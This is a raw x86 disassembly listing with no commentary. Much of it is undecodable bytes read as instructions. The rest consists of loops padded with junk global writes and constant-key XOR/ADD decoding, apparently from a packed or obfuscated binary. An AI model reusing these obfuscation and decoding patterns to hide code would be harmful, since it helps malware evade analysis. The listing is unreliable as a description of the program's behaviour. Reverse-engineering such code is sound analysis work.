  408c97:	cmp    cl,BYTE PTR ds:0x2aab720f
  408c9d:	mov    eax,ds:0x673ad9c8
  408ca2:	or     DWORD PTR [eax+0x6494f3d7],eax
  408ca8:	jp     0x408ce4
  408caa:	popf   
  408cab:	cmp    ebx,ebx
  408cad:	shl    esp,0x40
  408cb0:	add    BYTE PTR [eax],al
  408cb2:	inc    esp
  408cb3:	adc    eax,0xf1a0fe1d
  408cb8:	xlat   BYTE PTR ds:[ebx]
  408cb9:	cs addr16 mov cl,dh
  408cbd:	cmp    DWORD PTR [esi],0xffffff86
  408cc0:	mov    edi,0x9fec5508
  408cc5:	pop    ss
  408cc6:	shr    eax,0x6f
  408cc9:	jmp    0x7005:0x59574811
  408cd0:	in     al,dx
  408cd1:	imul   edi,eax,0x56
  408cd4:	pop    edi
  408cd5:	int    0xeb
  408cd7:	test   BYTE PTR [eax],0x9
  408cda:	in     eax,0x7d
  408cdc:	push   ebx
  408cdd:	jg     0x408c8e
  408cdf:	ins    BYTE PTR es:[edi],dx
  408ce0:	and    eax,DWORD PTR [edi]
  408ce2:	cwde   
  408ce3:	jl     0x408cf4
  408ce5:	dec    eax
  408ce6:	mov    edx,0x7c196eef
  408ceb:	or     BYTE PTR [eax+0xa9eaa1c],dh
  408cf1:	std    
  408cf2:	xchg   edx,eax
  408cf3:	jmp    0xec60:0x9abbf9d
  408cfa:	lods   eax,DWORD PTR ds:[esi]
  408cfb:	dec    edi
  408cfc:	jge    0x408cc5
  408cfe:	loop   0x408d02
  408d00:	rol    BYTE PTR [esi-0x3a],cl
  408d03:	jne    0x408ce1
  408d05:	stos   DWORD PTR es:[edi],eax
  408d06:	not    cl
  408d08:	lods   al,BYTE PTR ds:[esi]
  408d09:	retf   0xef95
  408d0c:	push   es
  408d0d:	sbb    ebx,DWORD PTR [ecx]
  408d0f:	leave  
  408d10:	inc    BYTE PTR [eax+0x31]
  408d13:	cwde   
  408d14:	arpl   WORD PTR [esi-0x70],dx
  408d17:	loop   0x408cc4
  408d19:	(bad)  
  408d1a:	stos   BYTE PTR es:[edi],al
  408d1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d1c:	dec    edx
  408d1d:	cmp    cl,BYTE PTR [eax+0xe7455ee]
  408d23:	fisubr WORD PTR [ebp-0x17]
  408d26:	dec    ecx
  408d27:	popf   
  408d28:	iret   
  408d29:	clc    
  408d2a:	div    BYTE PTR [ebx]
  408d2c:	or     ebx,esi
  408d2e:	pop    eax
  408d2f:	icebp  
  408d30:	mov    ecx,0x458e9bd7
  408d35:	and    al,0x38
  408d37:	out    dx,al
  408d38:	mov    bl,0x99
  408d3a:	loop   0x408d71
  408d3c:	dec    ebp
  408d3d:	jno    0x408d8f
  408d3f:	scas   al,BYTE PTR es:[edi]
  408d40:	sahf   
  408d41:	inc    ebp
  408d42:	out    0x59,al
  408d44:	mov    WORD PTR [esi],cs
  408d46:	outs   dx,BYTE PTR ds:[esi]
  408d47:	or     al,0xbc
  408d49:	mov    ebx,0xf454605
  408d4e:	push   ecx
  408d4f:	sub    eax,0x86a8b476
  408d54:	push   ds
  408d55:	adc    bl,bl
  408d57:	fadd   st(3),st
  408d59:	cmp    edi,esi
  408d5b:	enter  0xb85,0x29
  408d5f:	jb     0x408d5d
  408d61:	mov    eax,0x8eed82d1
  408d66:	retf   0xc0f4
  408d69:	pop    ebp
  408d6a:	push   ebx
  408d6b:	cmp    eax,0x1ec035f0
  408d70:	fisub  DWORD PTR [esi+ebx*4+0x6c9612c0]
  408d77:	xchg   ebp,eax
  408d78:	add    edx,edi
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	push   ecx
  408dab:	pop    ss
  408dac:	adc    eax,0x7ed1b1b2
  408db1:	jle    0x408d3d
  408db3:	jg     0x408e33
  408db5:	jle    0x408d8b
  408db7:	inc    esi
  408db8:	loop   0x408e0d
  408dba:	idiv   DWORD PTR [edi]
  408dbc:	mov    ds:0xa24ab54e,al
  408dc1:	dec    ebp
  408dc2:	and    al,0x78
  408dc4:	shr    cl,0x6c
  408dc7:	inc    esp
  408dc8:	das    
  408dc9:	(bad)  
  408dca:	and    DWORD PTR ds:[ecx],ecx
  408dcd:	and    eax,0xfb38fe6d
  408dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dd3:	fcmove st,st(4)
  408dd5:	(bad)  
  408dd6:	call   0x352cda1e
  408ddb:	ja     0x408d9c
  408ddd:	adc    ah,BYTE PTR [edi+0x68]
  408de0:	mov    ds:0xcbbef74f,al
  408de5:	fdiv   QWORD PTR [ebx-0xe]
  408de8:	and    al,0x70
  408dea:	sub    ebp,ecx
  408dec:	jp     0x408e11
  408dee:	pop    esp
  408def:	cld    
  408df0:	push   edi
  408df1:	mov    ecx,DWORD PTR [eax+0x31]
  408df4:	sub    BYTE PTR [ebx+0x6b],ch
  408df7:	and    BYTE PTR [edx-0x41d94a9c],al
  408dfd:	jmp    0x408d9d
  408dff:	xchg   ebx,eax
  408e00:	test   al,0xc5
  408e02:	dec    ebp
  408e03:	bound  esp,QWORD PTR [ebp+0xed69207]
  408e09:	test   eax,0x7ce51520
  408e0e:	or     DWORD PTR [edx],ebp
  408e10:	pop    ss
  408e11:	stc    
  408e12:	inc    esi
  408e13:	or     al,0xb2
  408e15:	mov    cl,0x4f
  408e17:	cmp    dh,BYTE PTR [eax+ebp*8]
  408e1a:	int    0x9
  408e1c:	(bad)  
  408e1d:	in     eax,0x85
  408e1f:	and    al,0x5c
  408e21:	sbb    esp,DWORD PTR [eax+0x10b2bb5f]
  408e27:	int    0x74
  408e29:	push   ecx
  408e2a:	inc    edi
  408e2b:	jp     0x408dbc
  408e2d:	mov    esi,0x3c9034e5
  408e32:	mov    ds:0x7f79d456,al
  408e37:	mov    ds:0x481fe9f2,eax
  408e3c:	add    DWORD PTR [esi-0x1b5b299a],0xffffffce
  408e43:	add    ch,BYTE PTR [ecx+0x7b]
  408e46:	popf   
  408e47:	mov    al,0xd3
  408e49:	push   eax
  408e4a:	rcl    al,1
  408e4c:	fstp   QWORD PTR [ecx]
  408e4e:	push   cs
  408e4f:	fs sahf 
  408e51:	mov    edi,0x6517582b
  408e56:	pop    eax
  408e57:	dec    DWORD PTR [esi+0x5857a398]
  408e5d:	jmp    0x2a78:0xbaaedeb3
  408e64:	cmp    al,0xe8
  408e66:	push   esi
  408e67:	mov    cl,0x5f
  408e69:	mov    ebx,0xedf6d1d3
  408e6e:	pusha  
  408e6f:	jmp    0x207f:0x6f10242b
  408e76:	test   DWORD PTR [eax-0x80],0xc1c202a3
  408e7d:	add    BYTE PTR [eax-0x74ae77d2],bh
  408e83:	ins    DWORD PTR es:[edi],dx
  408e84:	aad    0x28
  408e86:	add    BYTE PTR [ecx-0x5ef438a],bh
  408e8c:	sahf   
  408e8d:	test   al,0x25
  408e8f:	xchg   edx,eax
  408e90:	xchg   DWORD PTR [edi-0x3736d5ff],ecx
  408e96:	shl    BYTE PTR ss:[edi+0x3d],1
  408e9a:	push   ds
  408e9b:	icebp  
  408e9c:	out    0x69,al
  408e9e:	push   ss
  408e9f:	pop    eax
  408ea0:	cmp    DWORD PTR [esi],esi
  408ea2:	ror    BYTE PTR [esp+ecx*1+0x7ac5afea],cl
  408ea9:	jl     0x408eb4
  408eab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eac:	xrelease mov BYTE PTR [esi-0x53],dl
  408eb0:	fwait
  408eb1:	pop    esi
  408eb2:	sub    al,BYTE PTR [eax-0x1e]
  408eb5:	dec    ecx
  408eb6:	ins    BYTE PTR es:[edi],dx
  408eb7:	jl     0x408e66
  408eb9:	out    0x24,al
  408ebb:	jmp    0xb28b:0x20b055d4
  408ec2:	and    bl,BYTE PTR [edx+0x25]
  408ec5:	push   edi
  408ec6:	xor    DWORD PTR [ebp+0x4cfd630e],edx
  408ecc:	int3   
  408ecd:	cmp    edi,DWORD PTR [eax-0x1d]
  408ed0:	test   DWORD PTR [eax],esi
  408ed2:	outs   dx,BYTE PTR ds:[esi]
  408ed3:	call   0x96cf0cf0
  408ed8:	push   es
  408ed9:	push   ecx
  408eda:	mov    ds,ebp
  408edc:	xchg   eax,ebx
  408ede:	nop
  408edf:	out    dx,eax
  408ee0:	mov    cl,0x5
  408ee2:	stc    
  408ee3:	jp     0x408f08
  408ee5:	popf   
  408ee6:	cdq    
  408ee7:	fild   QWORD PTR [esi-0x78]
  408eea:	dec    edx
  408eeb:	das    
  408eec:	mov    bh,0xd8
  408eee:	jmp    0x26f05e92
  408ef3:	mov    ch,0x82
  408ef5:	loope  0x408ef1
  408ef7:	loopne 0x408f70
  408ef9:	and    al,0x85
  408efb:	leave  
  408efc:	and    ebp,DWORD PTR [ebx]
  408efe:	mov    ?,WORD PTR [edx-0x1a]
  408f01:	loopne 0x408f80
  408f03:	or     eax,0xd59961e3
  408f08:	es or  ecx,esp
  408f0b:	fs popa 
  408f0d:	in     al,dx
  408f0e:	call   0x5eb9:0x551b3abd
  408f15:	inc    esp
  408f16:	gs out 0x14,al
  408f19:	ret    
  408f1a:	dec    ebx
  408f1b:	xor    al,0xd2
  408f1d:	dec    esp
  408f1e:	pop    esi
  408f1f:	sahf   
  408f20:	jo     0x408f51
  408f22:	and    edi,DWORD PTR [eax-0x52d38255]
  408f28:	(bad)  
  408f29:	push   esi
  408f2a:	je     0x408f12
  408f2c:	jo     0x408ee1
  408f2e:	out    dx,al
  408f2f:	pushf  
  408f30:	inc    esp
  408f31:	mov    esp,DWORD PTR [edi+0x6471527e]
  408f37:	push   edx
  408f38:	or     DWORD PTR [edi],edx
  408f3a:	mov    bl,0x20
  408f3c:	jns    0x408f25
  408f3e:	shl    DWORD PTR [eax+0x0],0xac
  408f42:	jne    0x408ec4
  408f44:	xor    eax,0x15d42853
  408f49:	pop    es
  408f4a:	mov    ebx,DWORD PTR [ebp-0x8]
  408f4d:	xor    edx,eax
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	ds fwait
  408f62:	lods   eax,DWORD PTR ds:[esi]
  408f63:	mov    ebp,cs
  408f65:	fistp  QWORD PTR [esi+0x7e]
  408f68:	mov    bh,BYTE PTR [edi+0x7e]
  408f6b:	jle    0x408fe2
  408f6d:	adc    eax,0x299b8446
  408f72:	jmp    0xd007:0x4d5e845e
  408f79:	ins    BYTE PTR es:[edi],dx
  408f7a:	pop    ds
  408f7b:	jge    0x408f39
  408f7d:	xchg   ecx,eax
  408f7e:	xor    BYTE PTR [esi+ebx*2],0xde
  408f82:	sbb    BYTE PTR [eax+0x5fed665f],bh
  408f88:	push   0xffffffc1
  408f8a:	ret    
  408f8b:	in     eax,0x5a
  408f8d:	add    al,0x57
  408f8f:	xor    dl,BYTE PTR [ecx+0x45434744]
  408f95:	hlt    
  408f96:	(bad)  
  408f97:	push   ss
  408f98:	mov    edx,0x55f0f22b
  408f9d:	out    dx,al
  408f9e:	int    0x22
  408fa0:	inc    edx
  408fa1:	inc    eax
  408fa2:	sub    DWORD PTR [ecx+0x3a],0xffffffe9
  408fa6:	inc    ebx
  408fa7:	aaa    
  408fa8:	dec    ebp
  408fa9:	pop    ecx
  408faa:	das    
  408fab:	aad    0x63
  408fad:	pmaddwd mm0,QWORD PTR [edi]
  408fb0:	push   ds
  408fb1:	jle    0x408f76
  408fb3:	jae    0x408fcb
  408fb5:	add    dl,BYTE PTR [esi-0x45]
  408fb8:	push   esi
  408fb9:	sbb    cl,BYTE PTR [edx+0x2e74fc6d]
  408fbf:	pop    esp
  408fc0:	jno    0x409024
  408fc2:	mov    ecx,0x3b1f81ff
  408fc7:	inc    esp
  408fc8:	dec    esp
  408fc9:	cmp    eax,0x7b73d018
  408fce:	or     BYTE PTR [eax+esi*1+0x3c],bh
  408fd2:	push   es
  408fd3:	lock xor ah,BYTE PTR [esi-0x21]
  408fd7:	rcr    BYTE PTR [eax-0x5da74172],0xff
  408fde:	jmp    0x409006
  408fe0:	mov    eax,ds:0x1eb7b4ac
  408fe5:	fsub   QWORD PTR [ebp+0x26c4d26a]
  408feb:	and    eax,0xb7057af
  408ff0:	bound  eax,QWORD PTR [edi-0x649723a0]
  408ff6:	lea    ebx,[edi]
  408ff8:	stos   BYTE PTR es:[edi],al
  408ff9:	nop
  408ffa:	mov    esp,0x63824292
  408fff:	pop    ebp
  409000:	inc    edx
  409001:	test   ebp,edx
  409003:	call   0x8207640a
  409008:	jae    0x40907c
  40900a:	pop    ds
  40900b:	outs   dx,DWORD PTR ds:[esi]
  40900c:	pop    edi
  40900d:	scas   eax,DWORD PTR es:[edi]
  40900e:	cmp    ecx,0x62
  409011:	dec    edx
  409012:	or     ah,BYTE PTR [esi-0x71a73899]
  409018:	mov    ch,0xea
  40901a:	inc    edi
  40901b:	daa    
  40901c:	pushf  
  40901d:	fnsave [esi+eax*1+0x3443622]
  409024:	aam    0xdb
  409026:	sub    al,0x9c
  409028:	mov    dl,0xbc
  40902a:	addr16 loopne 0x408fe6
  40902d:	test   eax,0x60059bed
  409032:	cdq    
  409033:	xchg   DWORD PTR [ebx],ebp
  409035:	mov    edi,0xd5750f60
  40903a:	dec    edi
  40903b:	push   ebx
  40903c:	sbb    eax,0x504828cb
  409041:	das    
  409042:	fidiv  WORD PTR [ebx+0x4e]
  409045:	(bad)  
  409046:	retf   
  409047:	xchg   DWORD PTR [eax+0x6],ebx
  40904a:	dec    ebp
  40904b:	sbb    BYTE PTR [ecx],ah
  40904d:	imul   ebx,DWORD PTR [eax+0x5c2d4418],0x11
  409054:	adc    al,BYTE PTR [esi+0x6c]
  409057:	push   edx
  409058:	jb     0x409072
  40905a:	push   ss
  40905b:	cmp    BYTE PTR [ebx+0x2664791],ch
  409061:	icebp  
  409062:	into   
  409063:	jno    0x4090c5
  409065:	mov    ebp,ebp
  409067:	(bad)  
  409068:	cmp    al,0xef
  40906a:	pop    ecx
  40906b:	imul   esp,DWORD PTR [ebx-0x33],0xffffffb0
  40906f:	in     eax,dx
  409070:	ds or  bh,ch
  409073:	push   ecx
  409074:	aas    
  409075:	pop    esp
  409076:	dec    esi
  409077:	into   
  409078:	adc    al,0x9
  40907a:	xor    ecx,edi
  40907c:	test   bl,0x1c
  40907f:	inc    eax
  409080:	aam    0xf6
  409082:	popf   
  409083:	adc    BYTE PTR [edx-0xa],dl
  409086:	std    
  409087:	mov    ebx,0x44a3c9cf
  40908c:	add    esi,esp
  40908e:	mov    DWORD PTR [edx],ecx
  409090:	retf   0x4d14
  409093:	pop    eax
  409094:	cwde   
  409095:	pusha  
  409096:	iret   
  409097:	xchg   ebx,eax
  409098:	inc    eax
  409099:	loop   0x409117
  40909b:	stos   DWORD PTR es:[edi],eax
  40909c:	adc    bl,BYTE PTR es:[esi+0x45cfb6d5]
  4090a3:	mov    dl,0xf0
  4090a5:	loope  0x40911f
  4090a7:	add    DWORD PTR [eax-0x1f36d0c1],edi
  4090ad:	dec    ebp
  4090ae:	loop   0x4090d1
  4090b0:	into   
  4090b1:	out    0x85,al
  4090b3:	mov    ch,0x1a
  4090b5:	push   cs
  4090b6:	inc    ebx
  4090b7:	sbb    dl,al
  4090b9:	jno    0x409066
  4090bb:	mov    ah,0x16
  4090bd:	fidiv  WORD PTR [esi]
  4090bf:	mov    bl,0x37
  4090c1:	in     eax,0xd1
  4090c3:	sbb    eax,0x3f6f5e31
  4090c8:	inc    ebp
  4090c9:	into   
  4090ca:	rol    BYTE PTR [esi+ebp*2+0x6e],1
  4090ce:	fisubr DWORD PTR [ebp-0x8412ad2]
  4090d4:	mov    ds:0xf0850e02,eax
  4090d9:	add    al,0x14
  4090db:	mov    dl,0x24
  4090dd:	or     ch,BYTE PTR [ebx+0x6e]
  4090e0:	out    dx,al
  4090e1:	sub    DWORD PTR [edi+0x65],0x7f
  4090e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090e6:	jmp    0x5a53:0xa5375878
  4090ed:	inc    edx
  4090ee:	test   eax,0x9bc781fd
  4090f3:	fs scas eax,DWORD PTR es:[edi]
  4090f5:	lahf   
  4090f6:	and    DWORD PTR [esi+ecx*4+0x6a],eax
  4090fa:	push   esi
  4090fb:	lahf   
  4090fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090fd:	xor    DWORD PTR [edx+0x7a],ecx
  409100:	add    edx,ecx
  409102:	imul   edx,ebx
  409105:	cmp    edx,edi
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42e8b7
  40911f:	and    DWORD PTR ds:0x43035b,0x4302bd
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42ec5b,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x430363,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e658,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42e8f7
  40916b:	sbb    DWORD PTR ds:0x4302c1,0x4302f1
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42ec4b,0x624a
  409184:	call   DWORD PTR ds:0x42e8bf
  40918a:	adc    DWORD PTR ds:0x42e640,0x4302dd
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x4302d1,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x4302b5,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x4302ed,0x42e654
  4091c4:	call   DWORD PTR ds:0x42e963
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e648
  4091d6:	and    DWORD PTR ds:0x4302d9,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x4302b9,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42ec5b,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42ec5b,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42ec5b,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e863
  409219:	mov    ecx,DWORD PTR ds:0x42ec5b
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42ec5b,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ec63,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42ec5f
  409243:	sbb    eax,DWORD PTR ds:0x42ec5b
  409249:	mov    ds:0x42ec5f,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42ec5b
  409261:	and    DWORD PTR ds:0x42e63c,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x4302d5,0x430357
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e64c,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x4302d5,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42ec4b,0x430367
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42ec4b,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x4302c9,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x4302d9,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ec63,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e648,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x4302b5,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e87f
  40930f:	adc    DWORD PTR ds:0x42ec5f,0x42e64c
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x4302d5,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x4302d1,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x4302d1
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x4302d1,ecx
  409352:	cmp    DWORD PTR ds:0x4302d1,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x4302d1,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e867
  409375:	cmp    DWORD PTR ds:0x4302d1,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x4302d1
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x4302d1,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42ec4b
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e7e7
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x430353,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x43036b,0x17
  4093b9:	cmp    DWORD PTR ds:0x43036b,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x43036b,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e86b
  4093df:	cmp    DWORD PTR ds:0x43036b,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x43036b
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x43036b,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x43036b
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x43036b,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x43035f,0x10
  409415:	cmp    DWORD PTR ds:0x43035f,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x43035f,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e86f
  409438:	mov    ecx,DWORD PTR ds:0x43035f
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x43035f,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x4302e1
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x4302e9,0x16
  409461:	cmp    DWORD PTR ds:0x4302e9,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x4302e9,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e873
  409481:	mov    ecx,DWORD PTR ds:0x4302e9
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x4302e9,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42ec4f,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42ec4f
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42ec4f,ecx
  4094b7:	cmp    DWORD PTR ds:0x42ec4f,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42ec4f,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e77b
  4094d6:	push   0x42e725
  4094db:	call   DWORD PTR ds:0x42eaab
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x4302d1,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x43036b,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ec63,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x4302e9,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x430363,0x4302f1
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x4302b9,0x1e
  40953f:	cmp    DWORD PTR ds:0x4302b9,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x4302b9,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e65c
  409566:	call   DWORD PTR ds:0x42e877
  40956c:	mov    eax,ds:0x4302b9
  409571:	dec    eax
  409572:	mov    ds:0x4302b9,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430309
  409582:	mov    eax,ds:0x430393
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x43034f,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e658,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x4302c1,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x4302c1
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x4302c1,edx
  4095e8:	cmp    DWORD PTR ds:0x4302c1,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e74d
  409617:	call   DWORD PTR ds:0x42e87b
  40961d:	cmp    DWORD PTR ds:0x4302c1,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e648,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e648
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e648,ecx
  40964a:	cmp    DWORD PTR ds:0x42e648,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42eaaf
  409672:	cmp    DWORD PTR ds:0x42e648,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
